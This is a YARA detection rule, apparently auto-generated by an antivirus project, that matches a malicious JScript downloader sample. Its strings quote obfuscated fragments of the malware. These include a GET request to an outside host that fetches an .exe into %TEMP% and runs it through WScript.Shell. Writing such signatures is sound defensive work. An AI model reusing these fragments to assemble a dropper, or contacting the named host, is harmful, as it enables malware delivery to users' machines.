rule sig_20160328_ce0dd78d57529d387e79bab169a878b2 {
  meta:
    description = "datamaliciousorder - file 20160328_ce0dd78d57529d387e79bab169a878b2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2c1c049c1faf633c103f7fbd29183483cbfbe875f8ddf726db8a99597b44c620"

  strings:
    $s1  = "function Vvbuxhaw() {return Eqariuj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"vOVZ7KsJErj.exe\";};" fullword ascii
    $s2  = "Mcextrv[Fgjyotrl](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Wijzlkyem](Nskxshc() * 11)} while (Mcextrv[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ifynhqk(Mizkenq, Ntkhaqebgz){return Mizkenq - Ntkhaqebgz;};" fullword ascii
    $s5  = "var Eqariuj = function Olnxkpenas() {return WScript[Thmkm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Edllrh()" fullword ascii
    $s7  = "function Vxvepklrv(Dsglx){Eqariuj[\"Run\"](Dsglx, Plscwbfvm, Plscwbfvm);};" fullword ascii
    $s8  = "function Vdlylz() {return ((Rjdbqqtenu == true) && (Rjdbqqtenu == Ckrayar)) ? 1 : Plscwbfvm;};" fullword ascii
    $s9  = "Rjdbqqtenu = true; " fullword ascii
    $s10 = "var Txdul = new this[\"Date\"]();" fullword ascii
    $s11 = "var Zpulzpb = false;" fullword ascii
    $s12 = "function Nskxshc(){return 22;};" fullword ascii
    $s13 = "var Rjdbqqtenu = false;" fullword ascii
    $s14 = "function Wduej(Djvyv) {var Iarjyag = (1, 2, 3, 4, 5, Djvyv); return Iarjyag;};" fullword ascii
    $s15 = "var Ckrayar = false;" fullword ascii
    $s16 = "return Ifynhqk(Unuff, Gjpvhpdoh);" fullword ascii
    $s17 = "function Mybxdwhagj(){return Lmhbkh;};" fullword ascii
    $s18 = "Ckrayar = true; " fullword ascii
    $s19 = " while (Giunticq){" fullword ascii
    $s20 = "function Immfdrfizx(){return Thmkm;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}